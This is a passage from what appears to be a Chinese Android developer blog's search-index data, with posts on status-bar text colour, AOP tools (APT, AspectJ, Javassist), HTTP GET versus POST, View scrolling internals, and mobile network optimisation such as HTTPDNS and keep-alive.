meizuFlags.setInt(lp, value); window.setAttributes(lp); &#125; catch (Exception e) &#123; &#125; &#125; &#125; &#125; private static class MIUIStatusTextManagerImpl implements IStatusTextManager &#123; @Override public void updateStatusTextMode(Window window, boolean dark) &#123; if (window != null) &#123; Class clazz = window.getClass(); try &#123; int darkModeFlag; Class layoutParams = Class.forName( \"android.view.MiuiWindowManager$LayoutParams\"); Field field = layoutParams.getField(\"EXTRA_FLAG_STATUS_BAR_DARK_MODE\"); darkModeFlag = field.getInt(layoutParams); Method extraFlagField = clazz.getMethod(\"setExtraFlags\", int.class, int.class); if (dark) &#123; extraFlagField.invoke(window, darkModeFlag, darkModeFlag);//状态栏透明且黑色字体 &#125; else &#123; extraFlagField.invoke(window, 0, darkModeFlag);//清除黑色字体 &#125; if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123; //开发版 7.7.13 及以后版本采用了系统API，旧方法无效但不会报错，所以两个方式都要加上 if (dark) &#123; window.getDecorView().setSystemUiVisibility( View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR); &#125; else &#123; window.getDecorView().setSystemUiVisibility( View.SYSTEM_UI_FLAG_VISIBLE); &#125; &#125; &#125; catch (Exception e) &#123; &#125; &#125; &#125; &#125; private static class AndroidMStatusTextManagerImpl implements IStatusTextManager &#123; @Override public void updateStatusTextMode(Window window, boolean dark) &#123; if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123; if (dark) &#123; window.getDecorView().setSystemUiVisibility( View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR); &#125; else &#123; window.getDecorView().setSystemUiVisibility( View.SYSTEM_UI_FLAG_VISIBLE); &#125; &#125; &#125; &#125; interface IStatusTextManager &#123; void updateStatusTextMode(Window window, boolean dark); &#125;&#125;","categories":[],"tags":[]},{"title":"安卓AOP三剑客:APT,AspectJ,Javassist","slug":"安卓AOP三剑客-APT-AspectJ-Javassist","date":"2018-05-01T08:32:35.000Z","updated":"2020-05-11T07:23:44.842Z","comments":true,"path":"2018/05/01/安卓AOP三剑客-APT-AspectJ-Javassist/","link":"","permalink":"https://superxlcr.github.io/2018/05/01/安卓AOP三剑客-APT-AspectJ-Javassist/","excerpt":"","text":"本文转载自：https://www.jianshu.com/p/dca3e2c8608a?from=timeline AOP:面向切面编程(Aspect-Oriented Programming)。如果说，OOP如果是把问题划分到单个模块的话，那么AOP就是把涉及到众多模块的某一类问题进行统一管理。 Android AOP就是通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，提高开发效率。本文仅做知识介绍，相关详细内容不做过多描述，全部代码在项目T-MVP。 话不多说，先上图： AOP在Java后台，已经被各路大神研发出各种框架风生水起，例如SSH、SpringMVC等等殿堂级框架。在Android端，近年来也是异军突起。 APT代表框架：DataBinding,Dagger2, ButterKnife, EventBus3 、DBFlow、AndroidAnnotation 注解处理器 Java5 中叫APT(Annotation Processing Tool)，在Java6开始，规范化为 Pluggable Annotation Processing。Apt应该是这其中我们最常见到的了，难度也最低。定义编译期的注解，再通过继承Proccesor实现代码生成逻辑，实现了编译期生成代码的逻辑。 使用姿势 ：1、建立一个java的Module,写一个继承AbstractProcessor的类 2、在工具类里处理我们自定义的注解、生成代码： 3、在Gradle中添加 dependencies annotationProcessor project(‘:apt’)低版本需要使用第三方插件 apply plugin: ‘com.neenbedankt.android-apt’然后apt project(‘:apt’) 生成的源代码在build/generated/source/apt下可以看到 难点：就apt本身来说没有任何难点可言，难点一在于设计模式和解耦思想的灵活应用，二在与代码生成的繁琐，你可以手动字符串拼接，当然有更高级的玩法用squareup的javapoet，用建造者的模式构建出任何你想要的源代码。想详细了解可以看官网或这篇博客：Android 利用 APT 技术在编译期生成代码 优点：它的强大之处无需多言，看代表框架的源码，你可以学到很多新姿势。总的一句话：它可以做任何你不想做的繁杂的工作，它可以帮你写任何你不想重复代码。懒人福利，老司机必备神技，可以提高车速，让你以任何姿势漂移。它可以生成任何源代码供你在任何地方使用，就像剑客的剑，快疾如风，无所不及。 AspectJ代表框架： Hugo(Jake Wharton) AspectJ支持编译期和加载时代码注入，在开始之前，我们先看看需要了解的词汇：Advice（通知）: 典型的 Advice 类型有 before、after 和 around，分别表示在目标方法执行之前、执行后和完全替代目标方法执行的代码。 Joint point（连接点）: 程序中可能作为代码注入目标的特定的点和入口。 Pointcut（切入点）: 告诉代码注入工具，在何处注入一段特定代码的表达式。 Aspect（切面）: Pointcut 和 Advice 的组合看做切面。例如，在本例中通过定义一个 pointcut 和给定恰当的advice，添加一个了内存缓存的切面。 Weaving（织入）: 注入代码（advices）到目标位置（joint points）的过程。 下面这张图简要总结了一下上述这些概念。 使用姿势：1、建立一个android lib Module，定义一个切片，处理自定义注解，和添加切片逻辑 2、自定义一个gradle插件，使用 AspectJ 的编译器（ajc，一个java编译器的扩展),对所有受 aspect 影响的类进行织入，在 gradle 的编译 task 中增加额外配置，使之能正确编译运行。 3、在grade中apply plugin:com.app.plugin.AspectjPlugin 生成的class文件在build/intermediates/classes下可以看到 难点：AspectJ语法比较多，但是掌握几个简单常用的，就能实现绝大多数切片，完全兼容Java（纯Java语言开发，然后使用AspectJ注解，简称@AspectJ。）想详细了解可以看官网或这篇博客：深入理解AndroidAOP 优点：AspectJ除了hook之外，AspectJ还可以为目标类添加变量,接口。另外，AspectJ也有抽象，继承等各种更高级的玩法。它能够在编译期间直接修改源代码生成class，强大的团战切入功能，指哪打哪，鞭辟入里。有了此神器，编程亦如庖丁解牛，游刃而有余。 Javassist代表框架：热修复框架HotFix 、Savior（InstantRun）等 Javassist作用是在编译器间修改class文件，与之相似的ASM（热修复框架女娲）也有这个功能，可以让我们直接修改编译后的class二进制代码，首先我们得知道什么时候编译完成，并且我们要赶在class文件被转化为dex文件之前去修改。在Transfrom这个api出来之前，想要在项目被打包成dex之前对class进行操作，必须自定义一个Task，然后插入到predex或者dex之前，在自定义的Task中可以使用javassist或者asm对class进行操作。而Transform则更为方便，Transfrom会有他自己的执行时机，不需要我们插入到某个Task前面。Tranfrom一经注册便会自动添加到Task执行序列中，并且正好是项目被打包成dex之前。 使用姿势1、定义一个buildSrc module添加自定义Plugin 2、自定义Transform 3、在Transform里处理Task，通过inputs拿到一些东西，处理完毕之后就输出outputs，而下一个Task的inputs则是上一个Task的outputs。 4、使用Javassist操作字节码，添加新的逻辑或者修改原有逻辑 5、在grade中apply plugin:com.app.plugin.MyPlugin 修改后的class文件在build/intermediates/transforms/MyTrans下可以看到 难点：相比ASM，Javassist对java极度友好的api更容易快速上手，难点在思想的应用，小到切片逻辑的控制，如本例中的性能log打印日志，大到宏观的热修复，插件化中对preDex的操作修改，剑客精神到了这一层级，已经是上帝视角，无所不能。 优点：由于Javassist可以直接操作修改编译后的字节码，直接绕过了java编译器，所以可以做很多突破限制的事情，例如，跨dex引用，解决热修复中CLASS_ISPREVERIFIED的问题。 想详细了解可以看官网或这篇博客：Android热补丁动态修复技术 基于Instant Run思想的HotFix方案实现 AOPAOP技术常用在以下方面： 日志记录：业务埋点 持久化 性能监控：性能日志 数据校验：方法的参数校验 缓存：内存缓存和持久缓存 权限检查：业务权限（如登陆，或用户等级）、系统权限（如拍照定位） 异常处理 利用AOP技术将这些功能代码从业务逻辑代码中划分出来，通过对这些行为的分离，可以将它们独立到非业务逻辑。无论是日后新增，或是修改，都手到擒来易如反掌。 例如新的tmvp的demo中 apt用于生成实例化工厂，替换掉(对于小项目来说)繁杂冗余的Dagger2,实现了初始化功能的aop ；aspectj 的切片主要用在缓存和日志，用注解实现方法级别的内存缓存和方法耗时日志；Javassist 这里只是做了个示例，也是通过注解实现方法耗时日志的自动打印功能，当然这些都只是AOP的九牛一毛，AOP还可以做很多事，弥补OOP的不足，把所有跨对象的横切面关注点的功能都可以提取出来用AOP去实现 ，好处显而易见，将来要改的地方永远只有一处，而不是像OOP那样牵扯很多模块很多代码很多类。 当然还有更多未知的可能，需要等各位大侠来研究开发，让Aop在Android上的应用更加广泛。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"AOP","slug":"AOP","permalink":"https://superxlcr.github.io/tags/AOP/"}]},{"title":"关于HTTP请求方法GET与POST的思考","slug":"关于Http请求方法Get与Post的思考","date":"2018-04-15T07:22:33.000Z","updated":"2020-05-11T07:23:44.818Z","comments":true,"path":"2018/04/15/关于Http请求方法Get与Post的思考/","link":"","permalink":"https://superxlcr.github.io/2018/04/15/关于Http请求方法Get与Post的思考/","excerpt":"","text":"最近在做需求时处理了关于HTTP请求方法的问题，在此写篇博客做一下记录 HTTP简述HTTP，即超文本传输协议(HyperText Transfer Protocol)，互联网上应用最为广泛的一种网络协议，是一个以request-response(请求-回复)形式工作的应用层协议。在客户端向服务器发起一个HTTP请求的时候，我们可以选择相应的请求方法，其中最为常用的方法，就是GET方法与POST方法。 GET方法在使用GET方法发送HTTP请求时，一般而言，查询的键值对参数被附加在url地址的后面： 1/test/demo_form.asp?name1=value1&amp;name2=value2 GET请求具有如下特点： GET 请求可被缓存 GET 请求保留在浏览器历史记录中 GET 请求可被收藏为书签 GET 请求不应在处理敏感数据时使用 GET 请求有长度限制 GET 请求只应当用于取回数据 POST方法在使用POST方法发送HTTP请求时，一般而言，查询的键值对参数是添加在HTTP消息主体中发送的： 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 POST请求具有如下特点： POST 请求不会被缓存 POST 请求不会保留在浏览器历史记录中 POST 不能被收藏为书签 POST 请求对数据长度没有要求 GET方法与POST方法对比 方法 GET POST 后退按钮/刷新 没影响 数据会被重新提交（浏览器应该告知用户数据会被重新提交） 书签 可收藏为书签 不可收藏为书签 缓存 可缓存 不可缓存 编码类型 application/x-www-form-urlencoded application/x-www-form-urlencoded 或 multipart/form-data。为二进制数据使用多重编码。 历史记录 参数保留在浏览器历史中 参数不会保留在浏览器历史中 对参数数据长度的限制 当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是 2048 个字符） 无限制 对数据类型的限制 只允许 ASCII 字符 没有限制，也允许二进制数据 安全性 与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分 POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中 可见性 数据在 URL 中对所有人都是可见的 数据不会显示在 URL 中 对于两种方法安全性的思考：其实如果对于能够通过Fiddler或者Charles工具抓包的童鞋而言，两种方法其实都相当于是明文传输，都不安全。只不过POST方法由于参数在HTTP请求主体中，一般而言在浏览器上不容易看到，相对安全 对于两种方法参数传输的思考： GET方法和POST方法与数据如何传递没有关系GET和POST是由HTTP协议定义的。在HTTP协议中，Method和Data（url， body， header）是正交的两个概念，也就是说，使用哪个Method与应用层的数据如何传输是没有相互关系的HTTP没有要求，如果Method是POST数据就要放在body中。也没有要求，如果Method是GET，数据（参数）就一定要放在URL中而不能放在BODY中 HTTP协议对GET和POST都没有对长度的限制HTTP协议明确地指出了，HTTP头和Body都没有长度的要求。而对于url长度上的限制，有两方面的原因造成： 浏览器。据说早期的浏览器会对URL长度做限制。据说IE对url长度会限制在2048个字符内。 服务器。url长了，对服务器处理也是一种负担。过长的url会增加服务器的解析时间，因此多数服务器出于安全以及稳定方面的考虑，会给url长度加限制。但是这个限制是针对所有HTTP请求的，与GET、POST没有关系。","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"Http","slug":"Http","permalink":"https://superxlcr.github.io/tags/Http/"}]},{"title":"scrollTo方法图解，以及Scroller的使用","slug":"scrollTo-scrollBy方法图解，以及Scroller的使用","date":"2018-04-01T02:16:41.000Z","updated":"2020-05-11T07:23:44.782Z","comments":true,"path":"2018/04/01/scrollTo-scrollBy方法图解，以及Scroller的使用/","link":"","permalink":"https://superxlcr.github.io/2018/04/01/scrollTo-scrollBy方法图解，以及Scroller的使用/","excerpt":"","text":"scrollTo方法图解Android系统手机屏幕的左上角为坐标系，同时y轴方向与笛卡尔坐标系的y轴方向想反。通过提供的api如getLeft , getTop, getBottom, getRight可以获得控件在parent中的相对位置。当我们编写一些自定义的滑动控件时，会用到一些api如scrollTo(),scrollBy(),getScrollX(), getScrollY()。由于常常会对函数getScrollX(), getScrollY()返回的值的含义产生混淆，尤其是正负关系，因此本文将使用几幅图来对这些函数进行讲解以方便大家记忆。值得注意的是，调用View的scrollTo()和scrollBy()是用于滑动View中的内容，而不是把某个View的位置进行改变。scrollTo(int x, int y) 是将View中内容滑动到相应的位置，参考的坐标系原点为parent View的左上角。调用scrollTo(100, 0)表示将View中的内容移动到x = 100， y = 0的位置，如下图所示。注意，图中黄色矩形区域表示的是一个parent View，绿色虚线矩形为parent view中的内容。一般情况下两者的大小一致，本文为了显示方便，将虚线框画小了一点。图中的黄色区域的位置始终不变，发生位置变化的是显示的内容。同理，scrollTo(0, 100)的效果如下图所示：scrollTo(100, 100)的效果图如下：若函数中参数为负值，则子View的移动方向将相反: Scroller的使用使用scrollTo方法时，我们看到view的内容位置是立即进行刷新的，会给人一种不是特别友好的感觉当我们需要实现一种滑动动画的效果时，就需要使用Scroller工具类Scroller是一个用于计算滑动动画的工具类，我们的调用方式如下： 1234567891011// 调用方法开始计算滑动scroller.startScroll(startX, startY, endX, endY, duration)// 判断是否滑动结束，如果返回true，表示滑动动画仍未结束scroller.computeScrollOffset// 通过各种getter获取各种坐标scroller.getStartXscroller.getStartYscroller.getCurrXscroller.getCurrYscroller.getFinalXscroller.getFinalY 我们可以通过重写View#computeScroll回调方法来计算每次滑动的距离，最终实现滑动动画的效果： 123456@Overridepublic void computeScroll() &#123; if (scroller.computeScrollOffset()) &#123; scrollTo(scroller.getCurrX(), scroller.getCurrY()); &#125;&#125; scroll原理Scroll滚动的本质，实际上是针对View显示内容区域的偏移，通过canvas的translate方法来偏移绘制的原点，来达到绘制内容移动的效果 我们可以追踪下View的draw方法来了解scroll的原理： 以下有部分内容转自：https://juejin.im/entry/5948bfabfe88c2006a939278 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public void draw(Canvas canvas) &#123; final int privateFlags = mPrivateFlags; final boolean dirtyOpaque = (privateFlags &amp; PFLAG_DIRTY_MASK) == PFLAG_DIRTY_OPAQUE &amp;&amp; (mAttachInfo == null || !mAttachInfo.mIgnoreDirtyState); mPrivateFlags = (privateFlags &amp; ~PFLAG_DIRTY_MASK) | PFLAG_DRAWN; /* * Draw traversal performs several drawing steps which must be executed * in the appropriate order: * * 1. Draw the background * 2. If necessary, save the canvas' layers to prepare for fading * 3. Draw view's content * 4. Draw children * 5. If necessary, draw the fading edges and restore layers * 6. Draw decorations (scrollbars for instance) */ // Step 1, draw the background, if needed int saveCount; if (!dirtyOpaque) &#123; drawBackground(canvas); &#125; // skip step 2 &amp; 5 if possible (common case) final int viewFlags = mViewFlags; boolean horizontalEdges = (viewFlags &amp; FADING_EDGE_HORIZONTAL) != 0; boolean verticalEdges = (viewFlags &amp; FADING_EDGE_VERTICAL) != 0; if (!verticalEdges &amp;&amp; !horizontalEdges) &#123; // Step 3, draw the content if (!dirtyOpaque) onDraw(canvas); // Step 4, draw the children dispatchDraw(canvas); // Overlay is part of the content and draws beneath Foreground if (mOverlay != null &amp;&amp; !mOverlay.isEmpty()) &#123; mOverlay.getOverlayView().dispatchDraw(canvas); &#125; // Step 6, draw decorations (foreground, scrollbars) onDrawForeground(canvas); // we're done... return; &#125; ......&#125; 代码有删简，去掉了 Fading 边缘效果的处理代码。不过，我们仍然可以得到一些很重要的信息，其中包括一个 View 的绘制流程。代码注释中写的很详细。 View 绘制流程 绘制背景 绘制内容 绘制 children 如果有需要，绘制渐隐(fading) 效果 绘制装饰物 （scrollbars） 大家可能会注意到 dirtyOpaque 这个变量，它代表的是一个 View 是否是实心的，如果不是实心的就要绘制 background，否则就不需要。 12345678910111213141516171819202122232425262728293031private void drawBackground(Canvas canvas) &#123; final Drawable background = mBackground; if (background == null) &#123; return; &#125; setBackgroundBounds(); // Attempt to use a display list if requested. if (canvas.isHardwareAccelerated() &amp;&amp; mAttachInfo != null &amp;&amp; mAttachInfo.mHardwareRenderer != null) &#123; mBackgroundRenderNode = getDrawableRenderNode(background, mBackgroundRenderNode); final RenderNode renderNode = mBackgroundRenderNode; if (renderNode != null &amp;&amp; renderNode.isValid()) &#123; setBackgroundRenderNodeProperties(renderNode); ((DisplayListCanvas) canvas).drawRenderNode(renderNode); return; &#125; &#125; final int scrollX = mScrollX; final int scrollY = mScrollY; if ((scrollX | scrollY) == 0) &#123; background.draw(canvas); &#125; else &#123; canvas.translate(scrollX, scrollY); background.draw(canvas); canvas.translate(-scrollX, -scrollY); &#125;&#125; 在这里面，倒是看到了 canvas.translate(scrollX, scrollY),但是绘制了背景之后它又立马平移回去了。这里有些莫名其妙。但是，它不是我们的目标，我们的目标是 view.onDraw()。 在 draw()方法中，我们并没有找到线索。那么，我们注意到这个方法中来————dispatchDraw(),注释说它是绘制 children，那么显然它是属于 ViewGroup 中的方法。 ViewGroup.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970protected void dispatchDraw(Canvas canvas) &#123; boolean usingRenderNodeProperties = canvas.isRecordingFor(mRenderNode); final int childrenCount = mChildrenCount; final View[] children = mChildren; int flags = mGroupFlags; int clipSaveCount = 0; // We will draw our child's animation, let's reset the flag mPrivateFlags &amp;= ~PFLAG_DRAW_ANIMATION; mGroupFlags &amp;= ~FLAG_INVALIDATE_REQUIRED; boolean more = false; final long drawingTime = getDrawingTime(); final int transientCount = mTransientIndices == null ? 0 : mTransientIndices.size(); int transientIndex = transientCount != 0 ? 0 : -1; // Only use the preordered list if not HW accelerated, since the HW pipeline will do the // draw reordering internally final ArrayList&lt;View&gt; preorderedList = usingRenderNodeProperties ? null : buildOrderedChildList(); final boolean customOrder = preorderedList == null &amp;&amp; isChildrenDrawingOrderEnabled(); for (int i = 0; i &lt; childrenCount; i++) &#123; while (transientIndex &gt;= 0 &amp;&amp; mTransientIndices.get(transientIndex) == i) &#123; final View transientChild = mTransientViews.get(transientIndex); if ((transientChild.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE || transientChild.getAnimation() != null) &#123; more |= drawChild(canvas, transientChild, drawingTime); &#125; transientIndex++; if (transientIndex &gt;= transientCount) &#123; transientIndex = -1; &#125; &#125; final int childIndex = getAndVerifyPreorderedIndex(childrenCount, i, customOrder); final View child = getAndVerifyPreorderedView(preorderedList, children, childIndex); if ((child.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE || child.getAnimation() != null) &#123; more |= drawChild(canvas, child, drawingTime); &#125; &#125; while (transientIndex &gt;= 0) &#123; // there may be additional transient views after the normal views final View transientChild = mTransientViews.get(transientIndex); if ((transientChild.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE || transientChild.getAnimation() != null) &#123; more |= drawChild(canvas, transientChild, drawingTime); &#125; transientIndex++; if (transientIndex &gt;= transientCount) &#123; break; &#125; &#125; // mGroupFlags might have been updated by drawChild() flags = mGroupFlags; if ((flags &amp; FLAG_INVALIDATE_REQUIRED) == FLAG_INVALIDATE_REQUIRED) &#123; invalidate(true); &#125;&#125; 我们注意到 drawChild() 这个方法。 ViewGroup.java 123protected boolean drawChild(Canvas canvas, View child, long drawingTime) &#123; return child.draw(canvas, this, drawingTime);&#125; 这里引出了 View.draw(Canvas canvas, ViewGroup parent, long drawingTime) 方法，这个方法不同于 View.draw(Canvas canvas)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115/*** This method is called by ViewGroup.drawChild() to have each child view draw itself.** This is where the View specializes rendering behavior based on layer type,* and hardware acceleration.*/boolean draw(Canvas canvas, ViewGroup parent, long drawingTime) &#123; final boolean hardwareAcceleratedCanvas = canvas.isHardwareAccelerated(); /* If an attached view draws to a HW canvas, it may use its RenderNode + DisplayList. * * If a view is dettached, its DisplayList shouldn't exist. If the canvas isn't * HW accelerated, it can't handle drawing RenderNodes. */ boolean drawingWithRenderNode = mAttachInfo != null &amp;&amp; mAttachInfo.mHardwareAccelerated &amp;&amp; hardwareAcceleratedCanvas; boolean more = false; final int parentFlags = parent.mGroupFlags; Transformation transformToApply = null; boolean concatMatrix = false; final boolean scalingRequired = mAttachInfo != null &amp;&amp; mAttachInfo.mScalingRequired; // Sets the flag as early as possible to allow draw() implementations // to call invalidate() successfully when doing animations mPrivateFlags |= PFLAG_DRAWN; int sx = 0; int sy = 0; if (!drawingWithRenderNode) &#123; computeScroll(); sx = mScrollX; sy = mScrollY; &#125; final boolean drawingWithDrawingCache = cache != null &amp;&amp; !drawingWithRenderNode; final boolean offsetForScroll = cache == null &amp;&amp; !drawingWithRenderNode; int restoreTo = -1; if (!drawingWithRenderNode || transformToApply != null) &#123; restoreTo = canvas.save(); &#125; if (offsetForScroll) &#123; canvas.translate(mLeft - sx, mTop - sy); &#125; else &#123; if (!drawingWithRenderNode) &#123; canvas.translate(mLeft, mTop); &#125; if (scalingRequired) &#123; if (drawingWithRenderNode) &#123; // TODO: Might not need this if we put everything inside the DL restoreTo = canvas.save(); &#125; // mAttachInfo cannot be null, otherwise scalingRequired == false final float scale = 1.0f / mAttachInfo.mApplicationScale; canvas.scale(scale, scale); &#125; &#125; if (!drawingWithRenderNode) &#123; // apply clips directly, since RenderNode won't do it for this draw if ((parentFlags &amp; ViewGroup.FLAG_CLIP_CHILDREN) != 0 &amp;&amp; cache == null) &#123; if (offsetForScroll) &#123; canvas.clipRect(sx, sy, sx + getWidth(), sy + getHeight()); &#125; else &#123; if (!scalingRequired || cache == null) &#123; canvas.clipRect(0, 0, getWidth(), getHeight()); &#125; else &#123; canvas.clipRect(0, 0, cache.getWidth(), cache.getHeight()); &#125; &#125; &#125; if (mClipBounds != null) &#123; // clip bounds ignore scroll canvas.clipRect(mClipBounds); &#125; &#125; if (!drawingWithDrawingCache) &#123; if (drawingWithRenderNode) &#123; &#125; else &#123; // Fast path for layouts with no backgrounds if ((mPrivateFlags &amp; PFLAG_SKIP_DRAW) == PFLAG_SKIP_DRAW) &#123; mPrivateFlags &amp;= ~PFLAG_DIRTY_MASK; dispatchDraw(canvas); &#125; else &#123; // 在这里调用 draw() 单参数方法。 draw(canvas); &#125; &#125; &#125; else if (cache != null) &#123; &#125; else &#123; &#125; if (restoreTo &gt;= 0) &#123; canvas.restoreToCount(restoreTo); &#125; return more;&#125; 原本的代码很长，并且涉及到软件绘制和硬件绘制两种不同的流程。为了便于学习，现在剔除了硬件加速绘制流程和一些矩阵变换的代码。 drawingWithRenderNode 变量代表的就是是否要执行硬件加速绘制。 代码运行中，先会调用 computeScroll() 方法，然后将 mScrollX 和 mScrollY 赋值给变量 sx 和 sy 变量。(这也是为什么我们使用Scroller的时候需要重写computeScroll方法的原因) 12345678/** * Called by a parent to request that a child update its values for mScrollX * and mScrollY if necessary. This will typically be done if the child is * animating a scroll using a &#123;@link android.widget.Scroller Scroller&#125; * object. */public void computeScroll() &#123;&#125; 在 View 中 computeScroll() 是一个空方法，但注释说的很明白，这个方法是用来更新 mScrollX 和 mScrollY 的。典型用法就是一个 View 通过 Scroller 进行滚动动画（animating a scroll）时在这里更新 mScrollX 和 mScrollY。 接下来就是最关键的一环了。 123456789101112131415final boolean drawingWithDrawingCache = cache != null &amp;&amp; !drawingWithRenderNode;final boolean offsetForScroll = cache == null &amp;&amp; !drawingWithRenderNode;int restoreTo = -1;if (!drawingWithRenderNode || transformToApply != null) &#123; restoreTo = canvas.save();&#125;if (offsetForScroll) &#123; canvas.translate(mLeft - sx, mTop - sy);&#125; else &#123; if (!drawingWithRenderNode) &#123; canvas.translate(mLeft, mTop); &#125;&#125; 由于我们研究的目标不是说 View 的绘制是通过之前的缓存绘制，而是全新的绘制，所以 cache == null，offsetForScroll = true。那么，程序就会执行下面这段代码： 1canvas.translate(mLeft - sx, mTop - sy); 我们苦苦追寻的答案终于来临，canvas 确实平移了。好，我们继续向下。 1234567if ((mPrivateFlags &amp; PFLAG_SKIP_DRAW) == PFLAG_SKIP_DRAW) &#123; mPrivateFlags &amp;= ~PFLAG_DIRTY_MASK; dispatchDraw(canvas);&#125; else &#123; // 在这里调用 draw() 单参数方法。 draw(canvas);&#125; 最后的地方调用了 draw(canvas)，而 draw(canvas) 中调用了开发者常见的 onDraw(canvas)。 综上所述，scroll的原理是 我们通过各种方式来更新View的mScrollX以及mScrollY属性 在View的绘制过程中，通过canvas的translate操作平移画布，从而实现显示内容滑动的效果 PS: 可以通过 ViewConfiguration.getTouchSlop() 来获取最小能够识别的滑动距离，来判断滑动是否生效 通过 VelocityTracker 来计算速度，实现fling的快速滚动效果","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"移动 APP 网络优化概述","slug":"移动-APP-网络优化概述","date":"2018-03-31T02:36:14.000Z","updated":"2020-05-11T07:23:44.873Z","comments":true,"path":"2018/03/31/移动-APP-网络优化概述/","link":"","permalink":"https://superxlcr.github.io/2018/03/31/移动-APP-网络优化概述/","excerpt":"","text":"本文转载自：http://blog.cnbang.net/tech/3531/ 一般开发一个 APP，会直接调用系统提供的网络请求接口去服务端请求数据，再针对返回的数据进行一些处理，或者使用AFNetworking/OKHttp这样的网络库，管理好请求线程和队列，再自动做一些数据解析，就结束了。 但对于一些大型 APP，还会想针对网络的一些问题进行进一步优化，包括： 速度：网络请求的速度怎样能进一步提升？ 弱网：移动端网络环境随时变化，经常出现网络连接很不稳定可用性差的情况，怎样在这种情况下最大限度最快地成功请求？ 安全：怎样防止被第三方窃听/篡改或冒充，防止运营商劫持，同时又不影响性能？ 对基于浏览器的前端开发来说，网络这块能做的事情很少，但对于客户端 APP 来说，整个网络请求过程是自由控制的，可以做很多事情，很多大型 APP 都针对这三个问题做了很多网络层的优化，一些新的网络层协议像 HTTP2 / QUIC 也是在这些方面进行了不少优化，在这里边学习边整理，大致列举一下常见的做法。 速度正常一条网络请求需要经过的流程是这样： DNS 解析，请求DNS服务器，获取域名对应的 IP 地址。 与服务端建立连接，包括 tcp 三次握手，安全协议同步流程。 连接建立完成，发送和接收数据，解码数据。 这里有明显的三个优化点： 直接使用 IP 地址，去除 DNS 解析步骤。 不要每次请求都重新建立连接，复用连接或一直使用同一条连接(长连接)。 压缩数据，减小传输的数据大小。 逐条来看能做什么。 DNSDNS 完整的解析流程很长，会先从本地系统缓存取，若没有就到最近的 DNS 服务器取，若没有再到主域名服务器取，每一层都有缓存，但为了域名解析的实时性，每一层缓存都有过期时间，这种 DNS 解析机制有几个缺点： 缓存时间设置得长，域名更新不及时，设置得短，大量 DNS 解析请求影响请求速度。 域名劫持，容易被中间人攻击，或被运营商劫持，把域名解析到第三方 IP 地址，据统计劫持率会达到7%。 DNS 解析过程不受控制，无法保证解析到最快的IP 一次请求只能解析一个域名。 为了解决这些问题，就有了 HTTPDNS，原理很简单，就是自己做域名解析的工作，通过 HTTP 请求后台去拿到域名对应的 IP 地址，直接解决上述所有问题： 域名解析与请求分离，所有请求都直接用IP地址，无需 DNS 解析，APP 定时请求 HTTPDNS 服务器更新IP地址即可。 通过签名等方式，保证 HTTPDNS 请求的安全，避免被劫持。 DNS 解析由自己控制，可以确保根据用户所在地返回就近的 IP 地址，或根据客户端测速结果使用速度最快的 IP。 一次请求可以解析多个域名。 其余细节就不多说了，HTTPDNS 优点这么多，几乎成为中大型 APP 的标配。至此解决了第一个问题 — DNS 解析耗时的问题，顺便把一部分安全问题 — DNS 劫持也解决了。 连接第二个问题，连接建立耗时的问题，这里主要的优化思路是复用连接，不用每次请求都重新建立连接，如何更有效率地复用连接，可以说是网络请求速度优化里最主要的点了，并且这里的优化仍在演进过程中，值得了解下。 keep-aliveHTTP 协议里有个 keep-alive，HTTP1.1默认开启，一定程度上缓解了每次请求都要进行TCP三次握手建立连接的耗时。原理是请求完成后不立即释放连接，而是放入连接池中，若这时有另一个请求要发出，请求的域名和端口是一样的，就直接拿出连接池中的连接进行发送和接收数据，少了建立连接的耗时。 实际上现在无论是客户端还是浏览器都默认开启了keep-alive，对同个域名不会再有每发一个请求就进行一次建连的情况，纯短连接已经不存在了。但有个问题，就是这个 keep-alive 的连接一次只能发送接收一个请求，在上一个请求处理完成之前，无法接受新的请求。若同时发起多个请求，就有两种情况： 若串行发送请求，可以一直复用一个连接，但速度很慢，每个请求都要等待上个请求完成再进行发送。 若并行发送这些请求，那么首次每个请求都要进行tcp三次握手建立新的连接，虽然第二次可以复用连接池里这堆连接，但若连接池里保持的连接过多，对服务端资源产生较大浪费，若限制了保持的连接数，并行请求里超出的连接仍每次要建连。 对这个问题，新一代协议 HTTP2 提出了多路复用去解决。 多路复用HTTP2 的多路复用机制一样是复用连接，但它复用的这条连接支持同时处理多条请求，所有请求都可以并发在这条连接上进行，也就解决了上面说的并发请求需要建立多条连接带来的问题，网络上有张图可以较形象地表现这个过程： 